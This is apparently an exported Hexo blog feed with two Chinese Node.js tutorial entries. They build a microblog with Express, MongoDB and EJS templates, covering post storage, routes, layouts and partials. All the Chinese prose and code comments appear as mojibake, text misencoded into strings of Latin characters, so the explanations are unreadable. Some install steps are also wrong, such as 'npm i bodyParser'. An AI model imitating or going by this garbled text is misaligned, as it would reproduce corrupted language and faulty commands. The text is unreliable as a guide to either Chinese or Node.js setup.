ä¿å­˜ä¸€æ¡å‘è¨€åˆ°æ•°æ®åº“ * @param &#123;Function&#125; callback: æ‰§è¡Œå®Œæ•°æ®åº“æ“ä½œçš„åº”è¯¥æ‰§è¡Œçš„å›žè°ƒå‡½æ•° */Post.prototype.save = function save(callback) &#123; // å­˜å…¥ Mongodb çš„æ–‡æ¡£ var post = &#123; user: this.user, post: this.post, time: this.time, &#125;; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // è¯»å– posts é›†åˆ db.collection('posts', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; // ä¸º user å±žæ€§æ·»åŠ ç´¢å¼• // collection.ensureIndex('user'); // å†™å…¥ post æ–‡æ¡£ collection.insert(post, &#123; safe: true &#125;, function (err, post) &#123; mongodb.close(); callback(err, post); &#125;); &#125;); &#125;);&#125;;/* * æŸ¥è¯¢ä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰å‘è¨€ * @param &#123;String&#125; username: éœ€è¦æŸ¥è¯¢çš„ç”¨æˆ·çš„åå­— * @param &#123;Function&#125; callback: æ‰§è¡Œå®Œæ•°æ®åº“æ“ä½œçš„åº”è¯¥æ‰§è¡Œçš„å›žè°ƒå‡½æ•° */Post.get = function get(username, callback) &#123; mongodb.open(function (err, db) &#123; if (err) &#123; return callback(err); &#125; // è¯»å– posts é›†åˆ db.collection('posts', function (err, collection) &#123; if (err) &#123; mongodb.close(); return callback(err); &#125; // æŸ¥æ‰¾ user å±žæ€§ä¸º username çš„æ–‡æ¡£ï¼Œå¦‚æžœ username æ˜¯ null åˆ™åŒ¹é…å…¨éƒ¨ var query = &#123;&#125;; if (username) &#123; query.user = username; &#125; collection.find(query).sort(&#123; time: -1 &#125;).toArray(function (err, docs) &#123; mongodb.close(); if (err) &#123; callback(err, null); &#125; // å°è£… posts ä¸º Post å¯¹è±¡ var posts = []; docs.forEach(function (doc, index) &#123; var post = new Post(doc.user, doc.post, doc.time); posts.push(post); &#125;); callback(null, posts); &#125;); &#125;); &#125;);&#125; åœ¨åŽé¢æˆ‘ä»¬ä¼šé€šè¿‡æŽ§åˆ¶å™¨è°ƒç”¨è¿™ä¸ªæ¨¡å—ã€‚ å‘è¡¨å¾®åšé€šè¿‡ POST æ–¹æ³•è®¿é—® /post ä»¥å‘è¡¨å¾®åšï¼ŒçŽ°åœ¨æ¥å®žçŽ°è¿™ä¸ªæŽ§åˆ¶å™¨ã€‚åœ¨ routes/index.js ä¸­æ·»åŠ ä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314// ç”¨æˆ·å‘è¡¨å¾®åšrouter.post('/post', checkLogin);router.post('/post', function (req, res) &#123; var currentUser = req.session.user; var post = new Post(currentUser.name, req.body.post); post.save(function (err) &#123; if (err) &#123; req.flash('error', err); return res.redirect('/'); &#125; req.flash('success', 'å‘è¡¨æˆåŠŸ'); res.redirect('/u/' + currentUser.name); &#125;);&#125;); è¿™æ®µä»£ç é€šè¿‡ req.session.user èŽ·å–å½“å‰ç”¨æˆ·ä¿¡æ¯ï¼Œä»Ž req.body.post èŽ·å–ç”¨æˆ·å‘è¡¨çš„å†…å®¹ï¼Œå»ºç«‹ Post å¯¹è±¡ï¼Œè°ƒç”¨ save() æ–¹æ³•å­˜å‚¨ä¿¡æ¯ï¼Œæœ€åŽå°†ç”¨æˆ·é‡å®šå‘åˆ°ç”¨æˆ·é¡µé¢ã€‚ åœ¨è¿™é‡Œä¼šæŠ¥é”™ï¼Œéœ€è¦åœ¨ app.js å¼•å…¥ bodyParser 1npm i bodyParser å®‰è£…åŽå¼•å…¥ï¼Œå¹¶ä¸”è¿ç”¨ 1app.use(bodyParser.urlencoded()); ç”¨æˆ·é¡µé¢ç”¨æˆ·é¡µé¢çš„åŠŸèƒ½æ˜¯å±•ç¤ºç”¨æˆ·å‘è¡¨çš„æ‰€æœ‰å†…å®¹ï¼Œåœ¨routes/index.jsä¸­åŠ å…¥ä»¥ä¸‹ä»£ç ï¼š 1234567891011121314151617181920// ç”¨æˆ·çš„ä¸»é¡µ router.get('/u/:user', function (req, res) &#123; User.get(req.params.user, function (err, user) &#123; if (!user) &#123; req.flash('error', 'ç”¨æˆ·ä¸å­˜åœ¨'); return res.redirect('/'); &#125; Post.get(user.name, function (err, posts) &#123; console.log(posts); if (err) &#123; req.flash('error', err); return res.redirect('/'); &#125; res.render('user', &#123; title: user.name, posts: posts, &#125;); &#125;); &#125;);&#125;); å®ƒçš„åŠŸèƒ½æ˜¯é¦–å…ˆæ£€æŸ¥ç”¨æˆ·æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æžœå­˜åœ¨åˆ™ä»Žæ•°æ®åº“ä¸­èŽ·å–è¯¥ç”¨æˆ·çš„å¾®åšï¼Œæœ€åŽé€šè¿‡ posts å±žæ€§ä¼ é€’ç»™ user è§†å›¾ã€‚views/user.ejs çš„å†…å®¹å¦‚ä¸‹ï¼š 1234&lt;% if (user) &#123; %&gt; &lt;% include say.ejs %&gt;&lt;% &#125; %&gt;&lt;% include posts.ejs %&gt; æ ¹æ® DRY åŽŸåˆ™ï¼Œæˆ‘ä»¬æŠŠé‡å¤ç”¨åˆ°çš„éƒ¨åˆ†éƒ½æå–å‡ºæ¥ï¼Œåˆ†åˆ«æ”¾å…¥ say.ejs å’Œ posts.ejsã€‚say.ejsçš„åŠŸèƒ½æ˜¯æ˜¾ç¤ºä¸€ä¸ªå‘è¡¨å¾®åšçš„è¡¨å•ï¼Œå®ƒçš„å†…å®¹å¦‚ä¸‹ï¼š 123456&lt;form method="post" action="/post" class="well form-inline center" style="text-align:center;"&gt; &lt;input type="text" class="span8" name="post"&gt; &lt;button type="submit" class="btn btn-success"&gt;&lt;i class="icon-comment icon-white"&gt; &lt;/i&gt; å‘è¨€&lt;/button&gt;&lt;/form&gt; posts.ejs çš„ç›®çš„æ˜¯æŒ‰ç…§è¡Œåˆ—æ˜¾ç¤ºä¼ å…¥çš„ posts çš„æ‰€æœ‰å†…å®¹ï¼š 12345678910111213141516&lt;% posts.forEach(function(post, index) &#123; if (index % 3 == 0) &#123; %&gt; &lt;div class=&quot;row&quot;&gt; &lt;%&#125; %&gt; &lt;div class=&quot;span4&quot;&gt; &lt;h2&gt;&lt;a href=&quot;/u/&lt;%= post.user %&gt;&quot;&gt;&lt;%= post.user %&gt;&lt;/a&gt; è¯´&lt;/h2&gt; &lt;p&gt;&lt;small&gt;&lt;%= post.time %&gt;&lt;/small&gt;&lt;/p&gt; &lt;p&gt;&lt;%= post.post %&gt;&lt;/p&gt; &lt;/div&gt; &lt;% if (index % 3 == 2) &#123; %&gt; &lt;/div&gt;&lt;!-- end row --&gt; &lt;% &#125; %&gt; &lt;%&#125;) %&gt; &lt;% if (posts.length % 3 != 0) &#123; %&gt;&lt;/div&gt;&lt;!-- end row --&gt;&lt;%&#125; %&gt; å®Œæˆä¸Šè¿°å·¥ä½œåŽï¼Œé‡å¯æœåŠ¡å™¨ã€‚åœ¨ç”¨æˆ·çš„é¡µé¢ä¸Šå‘è¡¨å‡ ä¸ªå¾®åšï¼Œå¯ä»¥çœ‹åˆ°ä»¥ä¸‹æ•ˆæžœ é¦–é¡µæœ€åŽä¸€æ­¥æ˜¯å®žçŽ°é¦–é¡µçš„å†…å®¹ã€‚æˆ‘ä»¬è®¡åˆ’åœ¨é¦–é¡µæ˜¾ç¤ºæ‰€æœ‰ç”¨æˆ·å‘è¡¨çš„å¾®åšï¼ŒæŒ‰æ—¶é—´ä»Žæ–°åˆ°æ—§çš„é¡ºåºã€‚ åœ¨ routes/index.js ä¸­æ·»åŠ ä¸‹é¢ä»£ç ï¼š 12345678910111213// æ­£å¼å¾®åšè·¯ç”±router.get('/', function (req, res, next) &#123; Post.get(null, function (err, posts) &#123; if (err) &#123; posts = []; &#125; res.render('index', &#123; title: 'é¦–é¡µ', posts: posts, user: req.session.user, &#125;); &#125;);&#125;); å®ƒçš„åŠŸèƒ½æ˜¯è¯»å–æ‰€æœ‰ç”¨æˆ·çš„å¾®åšï¼Œä¼ é€’ç»™é¡µé¢ posts å±žæ€§ã€‚æŽ¥ä¸‹æ¥ä¿®æ”¹é¦–é¡µçš„æ¨¡æ¿index.ejsï¼š 12345678910111213141516&lt;% include header.ejs %&gt;&lt;% if (!user) &#123; %&gt;&lt;div class=&quot;hero-unit&quot;&gt; &lt;h1&gt;æ¬¢è¿Žæ¥åˆ° Microblog&lt;/h1&gt; &lt;p&gt;Microblog æ˜¯ä¸€ä¸ªåŸºäºŽ Node.js çš„å¾®åšç³»ç»Ÿã€‚&lt;/p&gt; &lt;p&gt; &lt;a class=&quot;btn btn-primary btn-large&quot; href=&quot;/login&quot;&gt;ç™»å½•&lt;/a&gt; &lt;a class=&quot;btn btn-large&quot; href=&quot;/reg&quot;&gt;ç«‹å³æ³¨å†Œ&lt;/a&gt; &lt;/p&gt;&lt;/div&gt;&lt;% &#125; else &#123; %&gt; &lt;% include say.ejs %&gt;&lt;% &#125; %&gt;&lt;% include posts.ejs %&gt;&lt;% include footer.ejs %&gt; å¯ä»¥çœ‹åˆ°é¦–é¡µæ•ˆæžœå¦‚ä¸‹ åˆ°è¿™é‡Œå°±åˆæ­¥å®Œæˆäº†ä¸€ä¸ªåŸºæœ¬åšå®¢çš„æ¨¡åž‹ï¼Œå®Œæ•´çš„æºç å¯ä»¥åˆ° https://github.com/LbhFront-end/LearnNodeJsCode æŸ¥çœ‹ã€‚æœ‰é—®é¢˜çš„å¯ä»¥äº’ç›¸äº¤æµ]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¥½çŽ©çš„Nodejs â€”â€” ä½¿ç”¨ Node.jsè¿›è¡Œ Web å¼€å‘ï¼ˆä¸­ï¼‰]]></title>
    <url>%2F2018-09-27-NodeJs-Part5%E4%B8%AD.html</url>
    <content type="text"><![CDATA[ä¸çŸ¥ä¸è§‰ï¼Œå·²ç»è¿‡åŽ»å¿«ä¸€ä¸ªæ˜ŸæœŸæ²¡æœ‰ç»§ç»­æ›´æ–°äº†ï¼Œä¸­ç§‹å‡æ—¥æ€»ä¼šä½¿äººæƒ³å®‰äºŽçŽ°çŠ¶ï¼Œè¿™ä¸€ç« ç»§ç»­ä¸Šé¢ä½¿ç”¨ Node.js è¿›è¡Œ Web å¼€å‘ï¼Œä»‹ç»æ¨¡æ¿å¼•æ“Žï¼Œå°è¯•å»ºç«‹ä¸€ä¸ªå¾®åšç½‘ç«™ï¼Œå®žçŽ°ç”¨æˆ·æ³¨å†Œç™»å½•å’Œå‘è¡¨å¾®åšçš„åŸºç¡€åŠŸèƒ½ã€‚å¥½äº†ï¼Œè®©æˆ‘ä»¬ä¸€èµ·å¼€å§‹å§ ä½¿ç”¨ Node.js è¿›è¡Œ Web å¼€å‘ï¼ˆä¸­ï¼‰æ¨¡æ¿å¼•æ“ŽExpress çš„è·¯ç”±æŽ§åˆ¶ï¼Œæ˜¯ç½‘ç»œæž¶æž„æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œå³ MVC æž¶æž„ä¸­çš„æŽ§åˆ¶å™¨ã€‚è€Œè§†å›¾ï¼Œä¸»è¦æ˜¯é€šè¿‡æ¨¡æ¿å¼•æ“Žçš„ä½¿ç”¨å’Œé›†æˆæ¥å®žçŽ°ã€‚è§†å›¾å†³å®šäº†ç”¨æˆ·æœ€ç»ˆçœ‹åˆ°çš„ä¸œè¥¿ï¼Œä¹Ÿæ˜¯æœ€é‡è¦çš„éƒ¨åˆ†ï¼Œè¿™é‡Œä»¥ ejs ä¸ºä¾‹ä»‹ç»æ¨¡æ¿å¼•æ“Žçš„ä½¿ç”¨æ–¹æ³•ã€‚ ä»€ä¹ˆæ˜¯æ¨¡æ¿å¼•æ“Žæ¨¡æ¿å¼•æ“Žï¼ˆTemplate Engineï¼‰ æ˜¯ä¸€ä¸ªä»Žé¡µé¢æ¨¡æ¿æ ¹æ®ä¸€å®šçš„è§„åˆ™ç”Ÿæˆçš„ HTML çš„å·¥å…·ã€‚æŒ‰ç…§è¿™ç§æ¨¡å¼ï¼Œæ•´ä¸ªç½‘ç«™å°±ç”±ä¸€ä¸ªä¸ªé¡µé¢æ¨¡å—ç»„æˆï¼Œæ‰€æœ‰çš„é€»è¾‘éƒ½åµŒå…¥åœ¨æ¨¡å—ä¸­ï¼Œè¿™ç§æ¨¡å¼å¤§å¤§é™ä½ŽåŠ¨æ€ç½‘é¡µå¼€å‘çš„é—¨æ§›ï¼Œä½†éšç€è§„æ¨¡çš„æ‰©å¤§ä¼šé‡åˆ°è®¸å¤šé—®é¢˜ã€‚ é¡µé¢åŠŸèƒ½é€»è¾‘ä¸Žé¡µé¢å¸ƒå±€æ ·å¼è€¦åˆï¼Œç½‘ç«™æ¨¡å¼å˜å¤§ä»¥åŽé€æ¸éš¾ä»¥ç»´æŠ¤ è¯­æ³•å¤æ‚ï¼Œå¯¹äºŽéžæŠ€æœ¯çš„ç½‘é¡µè®¾è®¡è€…æ¥è¯´é—¨æ§›è¾ƒé«˜ï¼Œéš¾ä»¥å­¦ä¹ ã€‚ åŠŸèƒ½è¿‡äºŽå…¨é¢ï¼Œé¡µé¢è®¾è®¡è€…å¯ä»¥åœ¨é¡µé¢ä¸Šç¼–ç¨‹ï¼Œä¸åˆ©äºŽåŠŸèƒ½åˆ’åˆ†ï¼Œä¹Ÿä½¿æ¨¡æ¿è§£æžæ•ˆçŽ‡é™ä½Žã€‚ è¿™äº›é—®é¢˜åˆ¶çº¦äº†æ—©æœŸæ¨¡æ¿å¼•æ“Žçš„å‘å±•ï¼Œç›´åˆ° MVC å¼€å‘æ¨¡å¼æ™®åŠï¼Œæ¨¡æ¿å¼•æ“Žæ‰å¼€å§‹éåœ°å¼€èŠ±ã€‚çŽ°ä»£çš„æ¨¡æ¿å¼•æ“Žæ˜¯ MVC çš„ä¸€éƒ¨åˆ†ï¼Œåœ¨åŠŸèƒ½åˆ’åˆ†ä¸Šå®ƒä¸¥æ ¼å±žäºŽè§†å›¾éƒ¨åˆ†ï¼Œå› æ­¤åŠŸèƒ½ä»¥ç”Ÿå­˜ HTML é¡µé¢ä¸ºæ ¸å¿ƒï¼Œä¸ä¼šå¼•å…¥è¿‡å¤šçš„ç¼–ç¨‹è¯­è¨€çš„åŠŸèƒ½ã€‚ æ¨¡æ¿å¼•æ“Žçš„åŠŸèƒ½ä¸»è¦æ˜¯å°†é¡µé¢æ¨¡å—å’Œè¦æ˜¾ç¤ºçš„æ•°æ®ç»“åˆèµ·æ¥ç”Ÿæˆ HTML é¡µé¢ã€‚å®ƒæ—¢å¯ä»¥è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯åˆå¯ä»¥è¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼Œå¤§å¤šæ•°æ—¶å€™å®ƒéƒ½åœ¨æœåŠ¡å™¨ç«¯ç›´æŽ¥è¢«è§£æžæˆ HTML ï¼Œè§£æžå®ŒæˆåŽå†ä¼ è¾“ç»™å®¢æˆ·ç«¯ï¼Œå› ä¸ºå®¢æˆ·ç«¯ç”šè‡³æ— æ³•åˆ¤æ–­é¡µé¢æ˜¯å¦æ˜¯æ¨¡æ¿å¼•æ“Žç”Ÿæˆçš„ã€‚æœ‰æ—¶å€™æ¨¡æ¿å¼•æ“Žä¹Ÿå¯ä»¥è€Œè¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼Œå³æµè§ˆå™¨ä¸­ï¼Œå…¸åž‹çš„ä»£è¡¨å°±æ˜¯ XSLTï¼Œå®ƒä»¥ XML ä¸ºè¾“å…¥ï¼Œåœ¨å®¢æˆ·ç«¯ç”Ÿæˆ HTML é¡µé¢ã€‚ä½†æ˜¯ç”±äºŽæµè§ˆå™¨å…¼å®¹æ€§é—®é¢˜ï¼ŒXSLT å¹¶ä¸æ˜¯å¾ˆæµè¡Œã€‚ç›®å‰çš„ä¸»æµè¿˜æ˜¯ç”±æœåŠ¡å™¨è¿è¡Œæ¨¡æ¿å¼•æ“Žã€‚ åœ¨MVCæž¶æž„ä¸­ï¼Œæ¨¡æ¿å¼•æ“ŽåŒ…å«åœ¨æœåŠ¡å™¨ç«¯ã€‚æŽ§åˆ¶å™¨å¾—åˆ°ç”¨æˆ·è¯·æ±‚åŽï¼Œä»Žæ¨¡åž‹èŽ·å–æ•°æ®ï¼Œè°ƒç”¨æ¨¡æ¿å¼•æ“Žã€‚æ¨¡æ¿å¼•æ“Žä»¥æ•°æ®å’Œé¡µé¢æ¨¡æ¿è¾“å…¥ï¼Œç”Ÿæˆ HTML é¡µé¢ï¼Œç„¶åŽè¿”å›žæŽ§åˆ¶å™¨ï¼Œç”±æŽ§åˆ¶å™¨äº¤ç»™å®¢æˆ·ç«¯ã€‚ ä½¿ç”¨æ¨¡æ¿å¼•æ“ŽåŸºäºŽ JavaScript çš„æ¨¡æ¿å¼•æ“Žæœ‰è®¸å¤šç§å®žçŽ°ã€‚æŽ¨èä½¿ç”¨ ejs ï¼ˆEmbedded JavaScriptï¼‰ï¼Œå› ä¸ºå®ƒååˆ†ç®€å•è€Œä¸”ä¸Ž Express é›†æˆè‰¯å¥½ã€‚ç”±äºŽå®ƒæ˜¯æ ‡å‡† JavaScript å®žçŽ°çš„ï¼Œå› æ­¤å®ƒä¸ä»…å¯ä»¥è¿è¡Œåœ¨æœåŠ¡å™¨ç«¯ï¼Œè¿˜å¯ä»¥è¿è¡Œåœ¨æµè§ˆå™¨ä¸­ã€‚ app.js ä¸­é€šè¿‡ä»¥ä¸‹ä¸¤ä¸ªè¯­å¥è®¾ç½®äº†æ¨¡æ¿å¼•æ“Žå’Œé¡µé¢æ¨¡æ¿çš„ä½ç½®ï¼š 123// view engine setupapp.set('views', path.join(__dirname, 'views'));app.set('view engine', 'ejs'); è¡¨æ˜Žè¦ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“Žæ˜¯ ejs ,é¡µé¢æ¨¡æ¿åœ¨ views å­ç›®å½•ä¸‹ã€‚åœ¨ routes/index.js ç”¨ä¸€ä¸‹è¯­å¥ï¼Œç»‘å®šè·¯ç”±å’Œè°ƒç”¨æ¨¡æ¿å¼•æ“Žã€‚ 1234567var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function (req, res, next) &#123; res.render('index', &#123; title: 'Express' &#125;);&#125;); res.render çš„åŠŸèƒ½æ˜¯è°ƒç”¨æ¨¡æ¿å¼•æ“Žï¼Œå¹¶å°†å…¶äº§ç”Ÿçš„é¡µé¢ç›´æŽ¥è¿”å›žç»™å®¢æˆ·ç«¯ã€‚å®ƒæŽ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ¨¡æ¿çš„åç§°ï¼Œå³ views ç›®å½•ä¸‹çš„æ¨¡æ¿æ–‡ä»¶åï¼Œä¸åŒ…å«æ–‡ä»¶çš„æ‰©å±•åï¼›ç¬¬äºŒä¸ªå‚æ•°æ˜¯ä¼ é€’ç»™æ¨¡æ¿çš„æ•°æ®ï¼Œç”¨äºŽæ¨¡æ¿ç¿»è¯‘ã€‚index.ejs å†…å®¹å¦‚ä¸‹ï¼š 12&lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt;&lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; ä¸Šé¢ä»£ç å…¶ä¸­æœ‰ä¸¤å¤„ &lt;%= title %&gt; ï¼Œç”¨äºŽæ¨¡æ¿å˜é‡æ˜¾ç¤ºï¼Œå®ƒä»¬åœ¨æ¨¡æ¿ç¿»è¯‘æ—¶ä¼šè¢«æ›¿æ¢æˆ Expressï¼Œå› ä¸º res.render ä¼ é€’äº† { title: &#39;Express&#39; } ã€‚ ejs çš„æ ‡ç­¾ç³»ç»Ÿéžå¸¸ç®€å•ï¼Œå®ƒåªæœ‰ä»¥ä¸‹3ç§æ ‡ç­¾ã€‚ &lt;% code %&gt; ï¼šJavaScript ä»£ç ã€‚ &lt;%= code %&gt; ï¼šæ˜¾ç¤ºæ›¿æ¢è¿‡ HTML ç‰¹æ®Šå­—ç¬¦çš„å†…å®¹ã€‚ &lt;%- code %&gt; ï¼šæ˜¾ç¤ºåŽŸå§‹ HTML å†…å®¹ã€‚ å¯ä»¥ç”¨å®ƒä»¬å®žçŽ°é¡µé¢æ¨¡æ¿ç³»ç»Ÿèƒ½å®žçŽ°çš„ä»»ä½•å†…å®¹ã€‚ é¡µé¢å¸ƒå±€views/index.ejs é‡Œé¢çš„ä»£ç  1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; Express å¯ä»¥è‡ªåŠ¨å¥—ç”¨ layout.ejs ï¼Œæ‰€ä»¥å¯ä»¥å°† index.ejs é‡Œé¢çš„ä»£ç åˆ†å¼€ 12345678910&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&apos;stylesheet&apos; href=&apos;/stylesheets/style.css&apos; /&gt; &lt;/head&gt; &lt;body&gt; &lt;%- body %&gt; &lt;/body&gt;&lt;/html&gt; layout.ejs æ˜¯ä¸€ä¸ªé¡µé¢å¸ƒå±€æ¨¡æ¿ï¼Œå®ƒæè¿°äº†æ•´ä¸ªé¡µé¢çš„æ¡†æž¶ç»“æž„ï¼Œé»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªå•ç‹¬çš„é¡µé¢éƒ½ç»§æ‰¿è‡ªè¿™ä¸ªæ¡†æž¶ï¼Œæ›¿æ¢æŽ‰ &lt;%- body %&gt; éƒ¨åˆ†ã€‚è¿™ä¸ªåŠŸèƒ½é€šå¸¸éžå¸¸æœ‰ç”¨ï¼Œå› ä¸ºä¸€èˆ¬ä¸ºäº†ä¿æŒæ•´ä¸ªç½‘ç«™çš„ä¸€è‡´é£Žæ ¼ï¼ŒHTML é¡µé¢çš„ &lt;head&gt; éƒ¨åˆ†ä»¥åŠé¡µçœ‰é¡µè„šä¸­çš„å¤§é‡å†…å®¹æ˜¯é‡å¤çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠå®ƒä»¬æ”¾åœ¨ layout.ejs ä¸­ã€‚å½“ç„¶ï¼Œè¿™ä¸ªåŠŸèƒ½å¹¶ä¸æ˜¯å¼ºåˆ¶çš„ï¼Œå¦‚æžœæƒ³å…³é—­å®ƒï¼Œå¯ä»¥åœ¨ app.js çš„ä¸­ app.configure ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼Œè¿™æ ·é¡µé¢å¸ƒå±€åŠŸèƒ½å°±è¢«å…³é—­äº†ã€‚ 123app.set('view options', &#123; layout: false&#125;); å¦ä¸€ç§æƒ…å†µæ˜¯ï¼Œä¸€ä¸ªç½‘ç«™å¯èƒ½éœ€è¦ä¸æ­¢ä¸€ç§é¡µé¢å¸ƒå±€ï¼Œä¾‹å¦‚ç½‘ç«™åˆ†å‰å°å±•ç¤ºå’ŒåŽå°ç®¡ç†ç³»ç»Ÿï¼Œä¸¤è€…çš„é¡µé¢ç»“æž„æœ‰å¾ˆå¤§çš„åŒºåˆ«ï¼Œä¸€å¥—é¡µé¢å¸ƒå±€ä¸èƒ½æ»¡è¶³éœ€æ±‚ã€‚è¿™æ—¶æˆ‘ä»¬å¯ä»¥åœ¨é¡µé¢æ¨¡æ¿ç¿»è¯‘æ—¶æŒ‡å®šé¡µé¢å¸ƒå±€ï¼Œå³è®¾ç½® layout å±žæ€§ï¼Œä¾‹å¦‚ï¼š 123456function(req, res) &#123; res.render('userlist', &#123; title: 'ç”¨æˆ·åˆ—è¡¨ï€­åŽå°ç®¡ç†ç³»ç»Ÿ', layout: 'admin' &#125;);&#125;; è¿™æ®µä»£ç ä¼šåœ¨ç¿»è¯‘ userlist é¡µé¢æ¨¡æ¿æ—¶å¥—ç”¨ admin.ejs ä½œä¸ºé¡µé¢å¸ƒå±€ã€‚ ç‰‡æ®µè§†å›¾Express çš„è§†å›¾ç³»ç»Ÿè¿˜æ”¯æŒç‰‡æ®µè§†å›¾ï¼ˆpartialsï¼‰ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªé¡µé¢çš„ç‰‡æ®µï¼Œé€šå¸¸æ˜¯é‡å¤çš„å†…å®¹ï¼Œç”¨äºŽè¿­ä»£æ˜¾ç¤ºã€‚å®ƒå°±æ˜¯ä¸€ä¸ªé¡µé¢çš„ç‰‡æ®µï¼Œé€šå¸¸æ˜¯é‡å¤çš„å†…å®¹ï¼Œç”¨äºŽè¿­ä»£æ˜¾ç¤ºã€‚é€šè¿‡å®ƒä½ å¯ä»¥å°†ç›¸å¯¹ç‹¬ç«‹çš„é¡µé¢å—åˆ†å‰²å‡ºåŽ»ï¼Œè€Œä¸”å¯ä»¥é¿å…æ˜¾å¼åœ°ä½¿ç”¨ for å¾ªçŽ¯ã€‚è€Œå…¶å®žåœ¨ Express4.0ä»¥åŽï¼Œå·²ç»å¼€å§‹ç”¨ include æ¥å–ä»£ partials äº†ã€‚ å¦‚æžœä»è¦ç”¨çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ­¥éª¤ï¼š è¿è¡Œcmd è¾“å…¥:npm install express-partials -g ä¸‹è½½æˆåŠŸåŽ.åœ¨app.js ä¸­å¼•ç”¨æ­¤æ’ä»¶ var partials = require(â€˜express-partialsâ€™); å¼€å¯æ­¤æ’ä»¶, åœ¨app.js ä¸­ app.set(â€˜view engineâ€™, â€˜ejsâ€™); ä»£ç åŽæ·»åŠ å¦‚ä¸‹ä»£ç : app.use(partials()); ä¸è¿‡è¿™é‡Œï¼Œæˆ‘è¿˜æ˜¯ç”¨æ–°çš„æ–¹æ³•ï¼Œé¦–å…ˆåœ¨ routers/index.js ä¸­æ–°å¢žä»¥ä¸‹å†…å®¹ã€‚ 123456router.get('/list', function (req, res, next) &#123; res.render('list', &#123; title: 'List', items: [1995, 'lbh', 'express', 'Node.js'] &#125;);&#125;); æŽ¥ç€åœ¨ viewsç›®å½•ä¸‹æ–°å»º list.ejs å†…å®¹æ˜¯ 12345&lt;ul&gt; &lt;% items.forEach(function(listitem)&#123;%&gt; &lt;% include listitem%&gt; &lt;%&#125;) %&gt;&lt;/ul&gt; åŒæ—¶å»ºç«‹ listitem.ejs å†…å®¹æ˜¯ 1&lt;li&gt;&lt;%= listitem %&gt;&lt;/li&gt; è®¿é—® http://localhost:3000/listï¼Œå¯ä»¥åœ¨æºä»£ç ä¸­çœ‹åˆ°ä»¥ä¸‹å†…å®¹ï¼š 1234567891011121314&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;ul&gt; &lt;li&gt;1995&lt;/li&gt; &lt;li&gt;lbh&lt;/li&gt; &lt;li&gt;express&lt;/li&gt; &lt;li&gt;Node.js&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;/html&gt; è§†å›¾åŠ©æ‰‹Express æä¾›äº†ä¸€ç§å«åšè§†å›¾åŠ©æ‰‹çš„å·¥å…·ï¼Œå®ƒçš„åŠŸèƒ½æ˜¯å…è®¸åœ¨è§†å›¾ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€çš„å‡½æ•°æˆ–å¯¹è±¡ï¼Œä¸ç”¨æ¯æ¬¡è°ƒç”¨è§†å›¾è§£æžçš„æ—¶å€™å•ç‹¬ä¼ å…¥ã€‚å‰é¢æåˆ°çš„ partial å°±æ˜¯ä¸€ä¸ªè§†å›¾åŠ©æ‰‹ã€‚ è§†å›¾åŠ©æ‰‹æœ‰ä¸¤ç±»ï¼Œåˆ†åˆ«æ˜¯é™æ€è§†å›¾åŠ©æ‰‹å’ŒåŠ¨æ€è§†å›¾åŠ©æ‰‹ã€‚è¿™ä¸¤è€…çš„å·®åˆ«åœ¨äºŽï¼Œé™æ€è§†å›¾åŠ©æ‰‹å¯ä»¥æ˜¯ä»»ä½•ç±»åž‹çš„å¯¹è±¡ï¼ŒåŒ…æ‹¬æŽ¥å—ä»»æ„å‚æ•°çš„å‡½æ•°ï¼Œä½†è®¿é—®åˆ°çš„å¯¹è±¡å¿…é¡»æ˜¯ä¸Žç”¨æˆ·è¯·æ±‚æ— å…³çš„ï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯é¡¹ç›®çš„åç§°ï¼Œåœ°å€ç­‰é…ç½®å‚æ•°æˆ–è€…æ˜¯å…¬å…±çš„æ–¹æ³•ï¼Œè¿™äº›å˜é‡ï¼Œæ–¹æ³•åªèƒ½ç”¨åœ¨æ¨¡æ¿è§†å›¾é‡Œé¢ã€‚åŠ¨æ€è§†å›¾åŠ©æ‰‹æŒ‡çš„æ˜¯è¯¥è§†å›¾å˜é‡ï¼Œæ–¹æ³•ä¸Žè¯·æ±‚æœ‰å…³ï¼Œä¸€èˆ¬ç”¨æ¥è§£æžè¯·æ±‚ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·ç™»å½•ä¿¡æ¯ï¼Œè¯·æ±‚åœ°å€ç­‰ã€‚ é™æ€è§†å›¾åŠ©æ‰‹å¯ä»¥é€šè¿‡ app.helpers() 